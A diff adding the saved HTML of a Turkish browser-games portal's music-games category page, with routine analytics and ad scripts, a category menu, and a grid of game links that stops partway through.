@@ -1,0 +1,1285 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" prefix="fb: http://www.facebook.com/2008/fbml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+        <title>Müzik oyunu oyna - Müzik oyunları</title>
+
+
+                    <meta name="description" content="Müzik Oyunu ile eğlenceli ve nota dolu oyunlar sizleri bekliyor ! Hem müzik becerinizi geliştirebilir, hemde müzik oyunları ile oldukça keyifli dakikalar geçirebilirsiniz." />
+                
+
+                                
+        
+        
+        <meta property="fb:app_id" content="124643584337921" /> 
+        <meta property="fb:admins" content="100000686875761,631044109,611417294" /> 
+        <meta property="og:type" content="game" />
+
+        <meta name="google-site-verification" content="TpCok0WW_HWyeusR5COh3yUAdguX4eFrOxIWbSSqYkc" />
+
+        <link href="https://plus.google.com/103600192229844824959" rel="publisher" />
+
+                    <link rel="canonical" href="http://muzik.oyunuoyna.com/" type="text/html" />
+                <link href="http://feeds.feedburner.com/oyunuoyna" rel="alternate" type="application/rss+xml" title="oyunuoyna.com RSS" />    
+        <link rel="stylesheet" href="http://www.oyunuoyna.com/public/new2/css/style.css?v2" />
+
+        <script type="text/javascript" src="http://www.oyunuoyna.com/public/new2/js/UnityObject.js"></script>
+        <script type="text/javascript" src="http://www.oyunuoyna.com/public/new2/js/swfobject.js"></script>
+        <script type="text/javascript" src="http://www.oyunuoyna.com/public/new2/js/common.js"></script>
+
+        <link rel="shortcut icon" href="http://www.oyunuoyna.com/favicon.ico" />
+
+        <script type="text/javascript" src="http://apis.google.com/js/plusone.js"></script>
+
+        <script type="text/javascript">
+            var __sess_id = 'PVlXTzJRVFp3UVRZNFlXWWpkak0xTVdZbGx6TTFFelloZFROeWdETXpRV00=';
+            var __user_id = '0';
+            var fbappid = '124643584337921';
+            var fburllogin = 'http://www.oyunuoyna.com/fblogin?redir=' + encodeURIComponent(window.location);
+        </script>
+        <!--script type="text/javascript" src="http://www.oyunuoyna.com/sync.js?1506686079"></script-->
+        <script type="text/javascript">
+            var _gaq = _gaq || [];
+            _gaq.push(['_setAccount', 'UA-27237310-1']);
+            _gaq.push(['_setDomainName', '.oyunuoyna.com']);
+            _gaq.push(['_trackPageview']);
+            _gaq.push(['_trackPageLoadTime']);
+
+            (function() {
+                var ga = document.createElement('script');
+                ga.type = 'text/javascript';
+                ga.async = true;
+                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+                var s = document.getElementsByTagName('script')[0];
+                s.parentNode.insertBefore(ga, s);
+            })();
+        </script>
+
+        <script type='text/javascript'>
+			var googletag = googletag || {};
+			  googletag.cmd = googletag.cmd || [];
+			  (function() {
+			    var gads = document.createElement('script');
+			gads.async = true;
+			gads.type = 'text/javascript';
+			var useSSL = 'https:' == document.location.protocol;
+			gads.src = (useSSL ? 'https:' : 'http:') +
+			  '//www.googletagservices.com/tag/js/gpt.js';
+			var node = document.getElementsByTagName('script')[0];
+			    node.parentNode.insertBefore(gads, node);
+			  })();
+        </script>
+        
+        <script type='text/javascript'>
+		  googletag.cmd.push(function() {
+		    googletag.defineSlot('/5018750/Oyunuoyna_Genel_Yapiskan', [160, 600], 'div-gpt-ad-1456148276926-0').addService(googletag.pubads());
+		    googletag.pubads().enableSingleRequest();
+		    googletag.enableServices();
+		  });
+		</script>
+
+        <script type="text/javascript">
+            /*
+             jQuery.expr[':'].regex = function(elem, index, match) {
+             var matchParams = match[3].split(','),
+             validLabels = /^(data|css):/,
+             attr = {
+             method: matchParams[0].match(validLabels) ? 
+             matchParams[0].split(':')[0] : 'attr',
+             property: matchParams.shift().replace(validLabels,'')
+             },
+             regexFlags = 'ig',
+             regex = new RegExp(matchParams.join('').replace(/^\s+|\s+$/g,''), regexFlags);
+             return regex.test(jQuery(elem)[attr.method](attr.property));
+             }
+             
+             $('*:regex(class, ya-head-stripe.*)').live('click', function(){
+             if ($(this).attr('class').indexOf('ya-head-stripe__close') == -1) {
+             _gaq.push(['_trackEvent', 'Reklam', 'Yandex.Browser', 'Click']);
+             }
+             return false;
+             });
+             */
+
+            $(window).scroll(function() {
+                if ($(window).scrollTop() < ($(document).height() - $(window).height() - 150)) {
+                    $('.sidebar-social').css('top', $(window).scrollTop());
+                }
+            });
+        </script>
+
+        
+    </head>
+    <body>
+
+        <div id="fb-root"></div>
+
+	<div style="width: 980px; margin: 0px auto; height: 0px; position: relative;">
+        
+        <!--script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        
+        <ins class="adsbygoogle"
+             style="display:inline-block;width:160px;height:600px"
+             data-ad-client="ca-pub-0240426644904360"
+             data-ad-slot="8930237013"></ins>
+        <script>
+        (adsbygoogle = window.adsbygoogle || []).push({});
+        </script -->
+        
+        
+        		
+
+    </div>
+<div class="header">
+    <div class="inner">
+        <div class="left">
+                            <a href="http://www.oyunuoyna.com/" title="Oyun Oyna"><span class="logo"></span></a>
+                    </div>
+        <div class="right">
+            <div class="top">
+                <ul class="menu">
+                    <li>
+                        <span class="icon blog"></span>
+                        <a target="_blank" title="Blog" href="http://blog.oyunuoyna.com">Blog</a>
+                    </li>
+                    <li>
+                        <span class="icon yardim"></span>
+                        <a href="http://video.oyunuoyna.com/" title="Video" target="_blank">Video</a>
+                    </li>
+                    <li>
+                        <span class="icon iletisim"></span>
+                        <a href="http://resim.oyunuoyna.com/" title="Resim" target="_blank">Resim</a>
+                    </li>
+                    <li>
+                        <span class="icon oyunlarim"></span>
+                        <a href="http://www.oyunuoyna.com/favorilerim">Oyunlarım (0)</a>
+                    </li>
+                </ul>
+                <div class="search">
+                    <form action="http://www.oyunuoyna.com/ara" method="get">
+                        <input type="text" name="q" autocomplete="off" placeholder="aranacak kelime" class="s" value="Çöp Adam">
+                            <a title="Ara" class="icon" href="javascript:;" onclick="$(this).parents('form').submit();"></a>
+                    </form>
+                </div>
+                <div class="menu2 fr">
+                                            <a href="javascript:fb_login();"><img alt="Facebook Login" src="http://www.oyunuoyna.com/public/new2/images/btn-facebook-login.png" /></a>
+                                    </div>
+            </div>
+            <div class="bottom">
+                <ul class="menu">
+                    <li> <a href="http://barbie.oyunuoyna.com/">Barbie</a></li>
+                    <li> <a href="http://araba.oyunuoyna.com/">Araba</a></li>
+                    <li> <a href="http://2kisilik.oyunuoyna.com/">İki Kişilik</a></li>
+                    <li> <a href="http://kiz.oyunuoyna.com/">Kız</a> </li>      
+                    <li> <a href="http://yaris.oyunuoyna.com/">Yarış</a> </li>
+                    <li> <a href="http://komik.oyunuoyna.com/">Komik</a> </li>
+                    <li> <a href="http://macera.oyunuoyna.com/">Macera</a> </li>
+                    <li> <a href="http://savas.oyunuoyna.com/">Savaş</a> </li>
+                    <li> <a href="http://oyuncini.oyunuoyna.com/">Oyun Cini</a> </li>
+                    <li> <a class="link-toggle" href="http://helikopter.oyunuoyna.com/">Helikopter</a> </li>
+                    <li> <a class="link-toggle" href="http://ucak.oyunuoyna.com/">Uçak</a> </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    jQuery(document).ready(function() {
+        setInterval(function() {
+            jQuery('.link-toggle').toggleClass('hover');
+        }, 2000);
+
+    });
+    
+    
+    $(document).ready(function(){
+    	$(window).scroll(function() {
+                if ($(window).scrollTop() >= 100) {
+                    $('.fixed-ads-right').css( {
+                    	'position' : 'absolute',
+                    	'right' : '-10px',
+                		'top': $(window).scrollTop() - 100
+                	});
+                } else {
+                	$('.fixed-ads-right').css( {
+                		'position' : 'relative',
+                		'top' : '0px!important'
+                		
+                	});
+                }
+            });
+    });
+    
+</script>
+
+
+<div class="wrapper">
+
+    <div class="wrapper-inner">
+
+        <div class="clr"></div>
+
+        <div class="container">
+        	
+        	
+<div style="display: block; width: 980px; position:relative; height: 90px; text-align: center;">
+	<div style=" width: 728px; margin: 0px auto; position:relative; height: 90px; text-align: center;">
+		<!-- Position: go.cz.bbelements.com Oyunuoyna.com(22145) / Site Geneli(1) / IAB_728x90(1) / IAB_728x90_Leaderboard(3) -->
+		<script type='text/javascript' charset='utf-8' src='http://go.cz.bbelements.com/please/code?j-22145.1.1.3.0.0._blank'></script>
+		<noscript>
+		<a href="http://go.cz.bbelements.com/please/redirect/22145/1/1/3/" target="_blank"><img src="http://go.cz.bbelements.com/please/showit/22145/1/1/3/?typkodu=img" border='0' alt='' /></a>
+		</noscript>
+	</div>
+</div>
+
+         	
+<div class="clr"></div>
+
+
+
+
+
+            <!--div class="sidebar-social">
+
+    <span class="fb">
+        <div class="fb-like" data-href="" data-send="false" data-layout="box_count" data-width="60" data-show-faces="true"></div>
+    </span>
+
+    <span class="twt">
+        <a href="https://twitter.com/share?url=" class="twitter-share-button" data-lang="en" data-size="small" data-count="vertical">Tweet</a>
+        <script>!function(d, s, id) {
+                var js, fjs = d.getElementsByTagName(s)[0];
+                if (!d.getElementById(id)) {
+                    js = d.createElement(s);
+                    js.id = id;
+                    js.src = "//platform.twitter.com/widgets.js";
+                    fjs.parentNode.insertBefore(js, fjs);
+                }
+            }(document, "script", "twitter-wjs");</script>
+    </span>
+
+    <span class="gplus">
+        <div class="g-plusone" data-size="tall" data-href="http://www.oyunuoyna.com/"></div>
+        <script type="text/javascript">
+            (function() {
+                var po = document.createElement('script');
+                po.type = 'text/javascript';
+                po.async = true;
+                po.src = 'https://apis.google.com/js/plusone.js';
+                var s = document.getElementsByTagName('script')[0];
+                s.parentNode.insertBefore(po, s);
+            })();
+        </script>
+    </span>
+</div-->
+
+<div class="sidebar-left">
+    <div class="box3">
+    <div class="top"></div>
+    <div class="con">
+        <div class="header">
+            <div class="title">kategoriler</div>
+        </div>
+
+        <div class="categories">
+            <ul>
+                                    <li ><a title="2 Kişilik" href="http://2kisilik.oyunuoyna.com/"><span class="icon-cat icon-cat-43"></span> 2 Kişilik</a></li>
+                
+                                    
+                                    <li ><a title="3 Boyutlu" href="http://3-boyutlu.oyunuoyna.com/"><span class="icon-cat icon-cat-28"></span> 3 Boyutlu</a></li>
+                
+                                    
+                                    <li ><a title="3D Oyunlar" href="http://3d.oyunuoyna.com/"><span class="icon-cat icon-cat-88"></span> 3D Oyunlar</a></li>
+                
+                                    
+                                    <li ><a title="Aksiyon " href="http://aksiyon.oyunuoyna.com/"><span class="icon-cat icon-cat-80"></span> Aksiyon </a></li>
+                
+                                    
+                                    <li ><a title="Ameliyat" href="http://ameliyat.oyunuoyna.com/"><span class="icon-cat icon-cat-3"></span> Ameliyat</a></li>
+                
+                                    
+                                    <li ><a title="Araba" href="http://araba.oyunuoyna.com/"><span class="icon-cat icon-cat-4"></span> Araba</a></li>
+                
+                                    
+                                    <li ><a title="Aşk" href="http://ask.oyunuoyna.com/"><span class="icon-cat icon-cat-100"></span> Aşk</a></li>
+                
+                                    
+                                    <li ><a title="Bakıcı" href="http://bakici.oyunuoyna.com/"><span class="icon-cat icon-cat-34"></span> Bakıcı</a></li>
+                
+                                    
+                                    <li ><a title="Bakugan" href="http://bakugan.oyunuoyna.com/"><span class="icon-cat icon-cat-29"></span> Bakugan</a></li>
+                
+                                    
+                                    <li ><a title="Balon Patlatma" href="http://balon-patlatma.oyunuoyna.com/"><span class="icon-cat icon-cat-5"></span> Balon Patlatma</a></li>
+                
+                                    
+                                    <li ><a title="Barbie" href="http://barbie.oyunuoyna.com/"><span class="icon-cat icon-cat-10"></span> Barbie</a></li>
+                
+                                    
+                                    <li ><a title="Basketbol" href="http://basketbol.oyunuoyna.com/?s=2"><span class="icon-cat icon-cat-6"></span> Basketbol</a></li>
+                
+                                    
+                                    <li ><a title="Beceri" href="http://beceri.oyunuoyna.com/"><span class="icon-cat icon-cat-8"></span> Beceri</a></li>
+                
+                                    
+                                    <li ><a title="Ben 10" href="http://ben-10.oyunuoyna.com/"><span class="icon-cat icon-cat-9"></span> Ben 10</a></li>
+                
+                                    
+                                    <li ><a title="Boyama" href="http://boyama.oyunuoyna.com/"><span class="icon-cat icon-cat-1"></span> Boyama</a></li>
+                
+                                    
+                                    <li ><a title="Bratz" href="http://bratz.oyunuoyna.com/"><span class="icon-cat icon-cat-108"></span> Bratz</a></li>
+                
+                                    
+                                    <li ><a title="Bulmaca" href="http://bulmaca.oyunuoyna.com/"><span class="icon-cat icon-cat-61"></span> Bulmaca</a></li>
+                
+                                    
+                                    <li ><a title="Çizgi Film" href="http://cizgi-film.oyunuoyna.com/"><span class="icon-cat icon-cat-12"></span> Çizgi Film</a></li>
+                
+                                    
+                                    <li ><a title="Çocuk" href="http://cocuk.oyunuoyna.com/"><span class="icon-cat icon-cat-13"></span> Çocuk</a></li>
+                
+                                    
+                                    <li ><a title="Defans" href="http://defans.oyunuoyna.com/"><span class="icon-cat icon-cat-79"></span> Defans</a></li>
+                
+                                            <li><a title="Zeka Oyunları" target="_blank" href="http://zeka.oyunu.net"><span class="icon-cat icon-cat-26"></span> Zeka Oyunları</a></li>
+                                    
+                                    <li ><a title="Dövüş" href="http://dovus.oyunuoyna.com/"><span class="icon-cat icon-cat-14"></span> Dövüş</a></li>
+                
+                                    
+                                    <li ><a title="Friv" href="http://friv.oyunuoyna.com/"><span class="icon-cat icon-cat-40"></span> Friv</a></li>
+                
+                                    
+                                    <li ><a title="Futbol" href="http://futbol.oyunuoyna.com/"><span class="icon-cat icon-cat-7"></span> Futbol</a></li>
+                
+                                    
+                                    <li ><a title="Giydirme" href="http://giydirme.oyunuoyna.com/"><span class="icon-cat icon-cat-15"></span> Giydirme</a></li>
+                
+                                    
+                                    <li ><a title="Hayvan" href="http://hayvan.oyunuoyna.com/"><span class="icon-cat icon-cat-35"></span> Hayvan</a></li>
+                
+                                    
+                                    <li ><a title="Hazel Bebek" href="http://hazelbebek.oyunuoyna.com/"><span class="icon-cat icon-cat-90"></span> Hazel Bebek</a></li>
+                
+                                    
+                                    <li ><a title="Helikopter" href="http://helikopter.oyunuoyna.com/"><span class="icon-cat icon-cat-58"></span> Helikopter</a></li>
+                
+                                    
+                                    <li ><a title="İşletme" href="http://isletme.oyunuoyna.com/"><span class="icon-cat icon-cat-42"></span> İşletme</a></li>
+                
+                                    
+                                    <li ><a title="Kamyon" href="http://kamyon.oyunuoyna.com/"><span class="icon-cat icon-cat-81"></span> Kamyon</a></li>
+                
+                                    
+                                    <li ><a title="Kayu" href="http://kayu.oyunuoyna.com/"><span class="icon-cat icon-cat-30"></span> Kayu</a></li>
+                
+                                    
+                                    <li ><a title="Kız" href="http://kiz.oyunuoyna.com/"><span class="icon-cat icon-cat-41"></span> Kız</a></li>
+                
+                                    
+                                    <li ><a title="Komik" href="http://komik.oyunuoyna.com/"><span class="icon-cat icon-cat-36"></span> Komik</a></li>
+                
+                                    
+                                    <li ><a title="Korku" href="http://korku.oyunuoyna.com/"><span class="icon-cat icon-cat-75"></span> Korku</a></li>
+                
+                                    
+                                    <li ><a title="Kuaför" href="http://kuafor.oyunuoyna.com/"><span class="icon-cat icon-cat-70"></span> Kuaför</a></li>
+                
+                                    
+                                    <li ><a title="Macera Oyunları" href="http://macera.oyunuoyna.com/"><span class="icon-cat icon-cat-16"></span> Macera Oyunları</a></li>
+                
+                                    
+                                    <li ><a title="Makyaj" href="http://makyaj.oyunuoyna.com/"><span class="icon-cat icon-cat-17"></span> Makyaj</a></li>
+                
+                                    
+                                    <li ><a title="Mario" href="http://mario.oyunuoyna.com/"><span class="icon-cat icon-cat-46"></span> Mario</a></li>
+                
+                                    
+                                    <li ><a title="Motor" href="http://motor.oyunuoyna.com/"><span class="icon-cat icon-cat-18"></span> Motor</a></li>
+                
+                                    
+                                    <li ><a title="Motor Yarışı" href="http://motoryarisi.oyunuoyna.com/"><span class="icon-cat icon-cat-78"></span> Motor Yarışı</a></li>
+                
+                                    
+                                    <li ><a title="Nişan" href="http://nisan.oyunuoyna.com/"><span class="icon-cat icon-cat-20"></span> Nişan</a></li>
+                
+                                    
+                                    <li ><a title="Oda" href="http://oda.oyunuoyna.com/"><span class="icon-cat icon-cat-22"></span> Oda</a></li>
+                
+                                    
+                                    <li ><a title="Online" href="http://online.oyunuoyna.com/"><span class="icon-cat icon-cat-39"></span> Online</a></li>
+                
+                                    
+                                    <li ><a title="Otobüs" href="http://otobus.oyunuoyna.com/"><span class="icon-cat icon-cat-72"></span> Otobüs</a></li>
+                
+                                    
+                                    <li ><a title="Park Etme" href="http://park-etme.oyunuoyna.com/"><span class="icon-cat icon-cat-33"></span> Park Etme</a></li>
+                
+                                    
+                                    <li ><a title="Pasta" href="http://pasta.oyunuoyna.com/"><span class="icon-cat icon-cat-68"></span> Pasta</a></li>
+                
+                                    
+                                    <li ><a title="Polis" href="http://polis.oyunuoyna.com/"><span class="icon-cat icon-cat-69"></span> Polis</a></li>
+                
+                                    
+                                    <li ><a title="Robot" href="http://robot.oyunuoyna.com/"><span class="icon-cat icon-cat-47"></span> Robot</a></li>
+                
+                                    
+                                    <li ><a title="Savaş Oyunları" href="http://savas.oyunuoyna.com/"><span class="icon-cat icon-cat-21"></span> Savaş Oyunları</a></li>
+                
+                                    
+                                    <li ><a title="Silah" href="http://silah.oyunuoyna.com/"><span class="icon-cat icon-cat-63"></span> Silah</a></li>
+                
+                                    
+                                    <li ><a title="Spor" href="http://spor.oyunuoyna.com/"><span class="icon-cat icon-cat-23"></span> Spor</a></li>
+                
+                                    
+                                    <li ><a title="Sue" href="http://sue.oyunuoyna.com/"><span class="icon-cat icon-cat-31"></span> Sue</a></li>
+                
+                                    
+                                    <li ><a title="Tadya" href="http://tadya.oyunuoyna.com/"><span class="icon-cat icon-cat-111"></span> Tadya</a></li>
+                
+                                    
+                                    <li ><a title="Taksi" href="http://taksi.oyunuoyna.com/"><span class="icon-cat icon-cat-73"></span> Taksi</a></li>
+                
+                                    
+                                    <li ><a title="Traktör" href="http://traktor.oyunuoyna.com/"><span class="icon-cat icon-cat-71"></span> Traktör</a></li>
+                
+                                    
+                                    <li ><a title="Türkçe" href="http://turkce.oyunuoyna.com/"><span class="icon-cat icon-cat-59"></span> Türkçe</a></li>
+                
+                                    
+                                    <li ><a title="Uçak Oyunları" href="http://ucak.oyunuoyna.com/"><span class="icon-cat icon-cat-24"></span> Uçak Oyunları</a></li>
+                
+                                    
+                                    <li ><a title="Yarış" href="http://yaris.oyunuoyna.com/"><span class="icon-cat icon-cat-45"></span> Yarış</a></li>
+                
+                                    
+                                    <li ><a title="Yemek" href="http://yemek.oyunuoyna.com/"><span class="icon-cat icon-cat-25"></span> Yemek</a></li>
+                
+                                    
+                                    <li ><a title="Zeka" href="http://zeka.oyunuoyna.com/"><span class="icon-cat icon-cat-26"></span> Zeka</a></li>
+                
+                                    
+                                    <li ><a title="Zombi" href="http://zombi.oyunuoyna.com/"><span class="icon-cat icon-cat-74"></span> Zombi</a></li>
+                
+                                    
+                                    <li class="last"><a title="Zuma" href="http://zuma.oyunuoyna.com/"><span class="icon-cat icon-cat-27"></span> Zuma</a></li>
+                
+                                    
+                            </ul>
+        </div>
+
+    </div>
+    <div class="bot"></div>
+</div>
+</div>
+
+<div class="content2">
+
+    <div class="box4">
+        <div class="top"></div>
+        <div class="con">
+            <div class="header">
+                <div class="title"><h1 style="display:inline-block;">Müzik Oyunları</h1> kategorisinin en çok oynanan oyunları</div>
+                <div class="pager">
+                    <ul>
+                        <li class="active"><a href="javascript:;" onmouseover="pagemostplayed(this, 0);">1</a></li>
+                        <li><a href="javascript:;" onmouseover="pagemostplayed(this, 5);">2</a></li>
+                        <li><a href="javascript:;" onmouseover="pagemostplayed(this, 10);">3</a></li>
+                        <li><a href="javascript:;" onmouseover="pagemostplayed(this, 15);">4</a></li>
+                        <li><a href="javascript:;" onmouseover="pagemostplayed(this, 20);">5</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="games games-mostplayed mt10">
+                                    <a href="http://online.oyunuoyna.com/Darkorbit-4978.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/4978/r/Darkorbit-34e-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Darkorbit</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://online.oyunuoyna.com/Drakensang-Online-10492.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/10492/r/Drakensang-Online-a07-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Drakensang Online</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://online.oyunuoyna.com/S-K-I-L-L-Special-Force-2-10949.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/10949/r/S-K-I-L-L-Special-Force-2-d15-oyunuoynacom.png" /><span class="play"></span></div>
+                                <div class="title">S.K.I.L.L Special Force 2</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://online.oyunuoyna.com/Bleach-Online-11952.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/11951/r/Bleach-Online-e77-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Bleach Online</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://online.oyunuoyna.com/Vikings-War-Of-Clans-17409.html"
+                                              
+                       >
+                        <div class="game mrn">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/17409/r/Vikings-War-Of-Clans-c0d-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Vikings War Of Clans</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://online.oyunuoyna.com/Crossfire-17418.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/17418/r/Crossfire-d19-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Crossfire</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Gitar-Calma-2730.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/5fafb7e60b6c2a561e95e1e84fea2f030.jpg" /><span class="play"></span></div>
+                                <div class="title">Gitar Çalma</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Muzikalite-2989.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/8c4dee2bff1abd5874df978cb221d6b80.jpg" /><span class="play"></span></div>
+                                <div class="title">Müzikalite</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Piyano-Calma-2992.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/74f6468dc22cc229b99a67cc11fd0bb30.jpg" /><span class="play"></span></div>
+                                <div class="title">Piyano Çalma</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Darbuka-Cal-5075.html"
+                                              
+                       >
+                        <div class="game mrn">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/273d585cf3c927552ac789c7606d6f130.jpg" /><span class="play"></span></div>
+                                <div class="title">Darbuka Çal</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Bateri-5548.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/7c9d5511fb7dc068cc0aeff50ee11a830.jpg" /><span class="play"></span></div>
+                                <div class="title">Bateri</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://komik.oyunuoyna.com/Harlem-Shake-7548.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/7548/r/Harlem-Shake-338-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Harlem Shake</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Cilek-Kiz-Dans-2990.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/2990/r/Cilek-Kiz-Dans-282-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Çilek Kız Dans</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Scooby-Doo-Muzik-2750.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/59d69cf3e64af4d452b7dce89f31a9440.JPG" /><span class="play"></span></div>
+                                <div class="title">Scooby Doo Müzik</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Ask-Sarkisi-3012.html"
+                                              
+                       >
+                        <div class="game mrn">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/e0484223cfc62f102d73d527ade41cc50.jpg" /><span class="play"></span></div>
+                                <div class="title">Aşk Şarkısı</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Dansci-Deniz-Kizi-2991.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/0086465bdcd7d365763554ae196817bc0.jpg" /><span class="play"></span></div>
+                                <div class="title">Dansçı Deniz Kızı</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Muzik-Yapma-5648.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/5648/r/5376c4.jpg" /><span class="play"></span></div>
+                                <div class="title">Müzik Yapma</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Flut-Cal-6344.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/6344/r/Flut-Cal-eae-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Flüt Çal</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Psy-Gentleman-7861.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/7861/r/Psy-Gentleman-dad-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Psy Gentleman</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Dora-Muzik-Cumbusu-6398.html"
+                                              
+                       >
+                        <div class="game mrn">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/6398/r/Dora-Muzik-Cumbusu-d55-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Dora Müzik Cümbüşü</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Keman-Cal-6563.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/6563/r/Keman-Cal-17c-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Keman Çal</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Karaoke-Yapma-3028.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/cfbf59d36209e94912d6a345438cdfce0.jpeg" /><span class="play"></span></div>
+                                <div class="title">Karaoke Yapma</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Ask-Ritmi-6844.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/6844/r/Ask-Ritmi-c93-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Aşk Ritmi</div>
